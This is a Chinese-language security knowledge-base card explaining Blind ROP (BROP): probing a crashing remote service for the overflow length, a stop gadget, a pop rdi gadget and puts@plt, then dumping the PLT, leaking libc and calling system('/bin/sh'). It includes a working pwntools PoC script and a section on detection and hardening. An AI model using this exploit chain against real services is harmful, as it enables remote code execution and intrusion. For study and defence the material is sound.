---
id: binary-pwn-rop-brop-blind-stop-gadget-plt-dump-libc
title: BROP 盲打：无源码/二进制时逐字节探测 stop gadget 与 pop rdi，dump plt 定位 libc 拿 shell
type: scenario
domain: binary
path: binary/pwn/rop
technique: brop-blind-rop
tags:
- pwn
- rop
- brop
- blind
- stack-overflow
- x64
- plt
- got
- libc
- remote
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-13'
updated: '2026-11-13'
verification:
  verified_by: verifier-V636
  verified_at: '2026-11-13T01:18:40+08:00'
  notes: 已对照原文全文与 10 张图片（01-10）逐张核对：本篇配图均为 ret2syscall（01-03）、ret2csu（04-06）、SROP（07-10）章节示意图，BROP 章节原文无图片，卡片依据正文脚本与终端输出核对：溢出长度 72、stop_gadget 0x4005c0（_start，gdb x/20i 验证）、brop_gadget 0x4007ba、pop_rdi_ret=brop_gadget+9=0x4007c3（pop r15 的 41 5f 与 ret c3 错位）、puts@plt=0x400555（\x7fELF 判定）、dump 0x400000-0x401000 得 puts@got=0x601018、LibcSearcher 匹配后二次溢出 system("/bin/sh")，均与卡内原理/步骤/PoC 一致。注：原文 dump 段脚本中 stop_gadget 曾写成 0x4006c0 与前面 0x4005c0 不一致，卡内统一采用已验证的 0x4005c0，不影响技术结论。附注：原文列举 nginx/MySQL/Apache/OpenSSH 均满足崩溃重启地址不变。dedup：首候选为自身；唯一 related 为 ctf-pwn-blind-format-string-dump-binary-got-hijack（盲打格式化字符串 dump，漏洞类型与利用方式不同），ret2csu 等为有二进制版本非同链，无 likely_duplicate；dup-scan 无涉及。原文未标注组件版本，affected_versions 不设。未验证点：未本机复跑 BROP 脚本；原文脚本为 Python2 语法，卡内 PoC 已改 Python3 字节串，逻辑一致。未执行文中任何指令或 PoC。
url: /docs/binary/pwn/rop/binary-pwn-rop-brop-blind-stop-gadget-plt-dump-libc/
draft: false
kb_aliases:
- BROP
- Blind ROP
- 盲打 ROP
- stop gadget
- brop gadget
- plt dump
- 远程盲测栈溢出
---

## 一句话结论

当攻击者拿不到目标二进制与源码、只能通过远程服务交互，且服务崩溃后会以相同地址重新启动时，可用 BROP（Blind ROP）以"响应是否为预期 banner / 是否崩溃"为 oracle 逐字节扫描：先确定栈溢出长度与能安全返回的 stop gadget，再用 `__libc_csu_init` 尾部 pop6 模式定位 brop gadget（+9 字节错位得到 `pop rdi; ret`），扫描出 `puts@plt` 并 dump plt 段拿到 `puts@got`，泄露 libc 地址匹配版本后二次溢出执行 `system("/bin/sh")`。

## 原理

- **BROP 的前提**：程序存在栈溢出可控制返回地址；服务崩溃后由父进程/守护进程重新拉起，且重启后的地址与之前一致（ASLR 只在进程启动时随机化，fork 型服务或按原映像重启的服务可满足；原文列举 nginx、MySQL、Apache、OpenSSH）。没有二进制时无法用 ROPgadget/IDA，只能靠远程响应做"盲测"。
- **oracle 模型**：每次 probe 发送一个 payload，根据返回内容判断结果——若返回正常 banner（如 `WelCome my friend`）说明返回地址落在能继续执行到 main/start 的地址（stop gadget / 有效 gadget）；若连接断开、进程崩溃（EOF/超时）说明地址无效；据此逐地址递增扫描。
- **溢出长度**：从 1 字节开始递增填充，直到进程崩溃（EOF）或不再回显 banner，即得到覆盖到返回地址所需的长度（原文为 72）。
- **stop gadget**：一个"返回过去不会崩溃、还能让主流程继续"的地址（如 `_start`/`main` 附近）。找到它才能构造后续探测 payload 的"安全落点"：无效地址会崩溃，有效 gadget 执行完会 ret 到 stop gadget 并回显 banner。
- **brop gadget**：`__libc_csu_init` 尾部的 `pop rbx; pop rbp; pop r12; pop r13; pop r14; pop r15; ret`（pop6）。探测 payload 为"候选地址 + 6 个 qword + stop_gadget"：若候选是 pop6，它会吃掉 6 个值再 ret 到 stop gadget 并回显 banner；再用"候选地址 + 大量填充"验证它确实在消费栈（不崩溃但也不回显）。原文扫到 `0x4007ba`。
- **pop rdi; ret 的错位**：x86 指令可变长，pop6 尾部 `pop r15`（`41 5f`）之后紧跟 `ret`（`c3`）；从 `41` 之后一字节（`5f c3`）开始解析就是 `pop rdi; ret`。因此 `pop_rdi_ret = brop_gadget + 9`（原文 `0x4007ba + 9 = 0x4007c3`），这是 BROP 能构造带参数调用的关键。
- **找 puts@plt**：用 `pop rdi; ret` 把参数设为 `0x400000`，候选地址作为调用目标，链尾接 stop gadget；无 PIE 的 64 位 ELF 在 `0x400000` 处是 `\x7fELF`，若返回数据以 `\x7fELF` 开头，候选地址就是 `puts@plt`（原文 `0x400555`）。
- **dump plt 与泄露 libc**：以 `puts@plt` 逐地址打印 `0x400000-0x401000` 的字节（遇 `\n` 截断），反汇编得到 `jmp qword ptr [puts_got]` 中的 GOT 地址（`0x601018`）；再用 `pop rdi; ret + puts@got + puts@plt + stop_gadget` 打印 puts 的真实地址，按低 12 位匹配 libc 版本，计算 `system` 与 `/bin/sh`，二次溢出 getshell。

## 触发条件

- 目标为存在栈溢出的网络服务，攻击者没有二进制/源码（或只有远程访问）。
- 服务崩溃后自动重启，且重启进程的地址与崩溃前一致（fork 模型或固定映像重启；若每次 exec 重新随机化 ASLR 则不成立）。
- 无栈 canary，或 canary 可借助 BROP 泄露（逐字节爆破/泄露）。
- 无 PIE，或代码基址已知/可爆破；64 位目标存在 `__libc_csu_init` 尾部 pop6 序列（老编译器/glibc 默认产物）。
- 能区分"正常回显"与"崩溃/断开"，且请求频率不受严格限制。

## 利用步骤

1. 交互确认服务 banner 与输入点；用递增长度 payload 测出到返回地址的溢出长度（崩溃或不再回显前的最大长度）。
2. 从代码段起始（无 PIE 常见 `0x400500`）逐地址扫描 stop gadget：返回地址填候选地址，若仍回显 banner 即命中（原文 `_start` `0x4005c0`）。
3. 扫描 brop gadget：候选地址 + 6 个 qword + stop gadget，回显 banner 的候选进入二次验证（候选 + 长填充，不崩溃则确认消费栈），原文命中 `0x4007ba`。
4. 计算 `pop_rdi_ret = brop_gadget + 9`；扫描 `puts@plt`：`pop_rdi_ret + 0x400000 + 候选 + stop_gadget`，回显以 `\x7fELF` 开头即命中（原文 `0x400555`）。
5. dump plt：逐地址调用 `puts(addr)` 读取 `0x400000-0x401000`，离线反汇编定位 `puts@got`（原文 `0x601018`）。
6. 泄露 `puts@got` 的真实地址，用 LibcSearcher/libc-database 匹配 libc 版本，计算 `system`/`str_bin_sh`。
7. 二次溢出：`pop_rdi_ret + binsh + system + stop_gadget`，进入 shell。

## PoC

```python
from pwn import *

def get_stop_addr(length, start=0x400500):
    addr = start
    while True:
        try:
            p = process('./brop')
            p.recvuntil(b'Do you know password?\n')
            p.send(b'a'*length + p64(addr))
            if p.recv().startswith(b'WelCome my friend'):
                return addr
            p.close()
        except EOFError:
            p.close()
        addr += 1

def get_brop_gadget(length, stop, addr):
    p = process('./brop')
    p.recvuntil(b'password?\n')
    p.send(b'a'*length + p64(addr) + p64(0)*6 + p64(stop))
    ok = p.recv().startswith(b'WelCome')
    p.close()
    return ok

# 原文实测：溢出长度 72、stop_gadget=0x4005c0、brop_gadget=0x4007ba
buffer_length = 72
stop_gadget   = 0x4005c0
brop_gadget   = 0x4007ba
pop_rdi_ret   = brop_gadget + 9      # 0x4007c3: pop rdi; ret（opcode 错位）

# 扫描 puts@plt：pop_rdi(0x400000) 后打印，ELF 魔数 \x7fELF 作为命中标志
def get_puts_plt(length, stop, pop_rdi):
    addr = 0x400500
    while True:
        p = process('./brop')
        p.recvuntil(b'Do you know password?\n')
        p.send(b'a'*length + p64(pop_rdi) + p64(0x400000) + p64(addr) + p64(stop))
        out = p.recv()
        p.close()
        if out.startswith(b'\x7fELF'):
            return addr
        addr += 1

# dump 0x400000-0x401000 后反汇编定位 puts@got，再泄露第二个阶段
```

说明：以上为原文脚本核心逻辑的结构化复现，未在本机执行；仅用于授权测试。完整 dump 循环见原文思路：逐字节 `puts(addr)` 直到 `\n` 截断，拼接后离线反汇编找 `jmp qword ptr [got]`。

## 变体与关联

- **32 位变体**：使用 32 位 csu gadget/`pop ebx` 与 `int 0x80`；stop gadget 与 PLT 扫描逻辑相同。
- **canary 变体**：BROP 可逐字节爆破 canary（覆盖到 canary 首字节，若仍返回 banner 则字节正确），再继续溢出。
- **PIE 变体**：需先爆破代码基址（部分覆盖返回地址低字节），或利用服务重启地址不变的特性缩小范围。
- **泄露函数替换**：`write@plt` 可指定长度、不会被 NUL 截断，dump 更稳定；`puts` 遇到 `\x00` 会提前结束。
- **关联**：[[binary-pwn-rop-ret2csu-write-got-leak-ret2libc]]（有二进制时用 csu 三参数泄露，是 BROP 的"非盲"版本）、[[binary-pwn-stack-ret2libc-32bit-got-leak-libc-version-second-stage]]（GOT 泄露与 libc 版本匹配）、[[binary-pwn-stack-ret2dlresolve-partial-relro-64-fake-linkmap]]（无 libc 信息时的另一条解析路径）。
- **边界**：每次崩溃后地址变化、canary 无法爆破、PIE 无法定位、服务有严格崩溃重启策略或请求限速时，BROP 不成立或成本极高。

## 检测与防御

- **崩溃监控与限速**：BROP 需要大量无效地址 probe，表现为同一来源高频触发崩溃/EOF；对异常连接做速率限制、崩溃计数告警并临时封禁。
- **加固**：开启栈 canary（`-fstack-protector-all`）、PIE、Full RELRO、NX；服务崩溃后由新的 exec 重启（重新随机化 ASLR），避免 fork 复用地址空间。
- **运行时**：CET/shadow stack 可阻断 ret 劫持；用 seccomp 限制危险 syscall；对服务进程的 SIGSEGV 频率与连接来源做关联分析。
- **修复**：消除栈溢出（有界拷贝、长度校验），并保持二进制符号/加固策略不可被远程推断（PIE + 去除 banner 中的版本信息）。
